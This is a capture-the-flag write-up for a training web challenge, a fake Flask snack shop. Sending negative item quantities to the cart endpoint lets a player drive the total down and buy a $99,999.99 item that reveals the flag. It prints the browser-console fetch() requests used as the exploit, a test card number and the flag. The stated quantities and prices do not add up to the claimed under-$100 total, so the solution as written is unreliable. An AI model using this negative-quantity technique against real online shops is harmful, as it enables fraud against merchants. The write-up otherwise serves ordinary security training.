

##  Description
The website is a fake online snack shop built using Flask. One product called **"Elite Hacker Snack"** costs `$99999.99` and reveals the **flag** on successful purchase. But you're only given **$100.00**.

##  Objective
Buy the **Elite Hacker Snack** and retrieve the flag using logic flaws in the cart system — no cookie tampering or source code access required.

##  Key Observations
- Flask app uses server-side SQLite with in-memory DB.
- Checkout logic includes:
  - Check if user balance ≥ cart total
  - Check if **total > 0**
  - Check if order contains `"Elite Hacker Snack"` → reveal flag
- No client-side restrictions on **negative quantities**!

## Exploit Steps
1. **Add -2 Elite Hacker Snacks** to get negative cart total (~ -$199,999.98).
2. **Add thousands of positive-priced items** like Stealth Cookies ($4.20 each).
3. Fine-tune quantities to bring total to ~ $50.
4. **Add 1 more Elite Hacker Snack** to satisfy the flag condition.
5. Proceed to `/checkout`, enter dummy card info, and get the flag.

##  Exploit Payload (DevTools Console)
```
fetch("/cart/add", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "product_id=6&quantity=-2"
});

fetch("/cart/add", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "product_id=1&quantity=47568"
});

fetch("/cart/add", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "product_id=6&quantity=1"
});
```

###  Dummy Payment Info
- Card Number: `4111111111111111`
- Expiry: `03/30`
- CVV: `123`

 You may need to tweak quantity to get total **under $100 but > $0**.

##  Result
Once checkout is complete and `"Elite Hacker Snack"` is in the order, you'll see:

```
cube{happy birthday!:flag_us::flag_us::flag_us::flag_us::flag_us:_c65ece2a}```

---
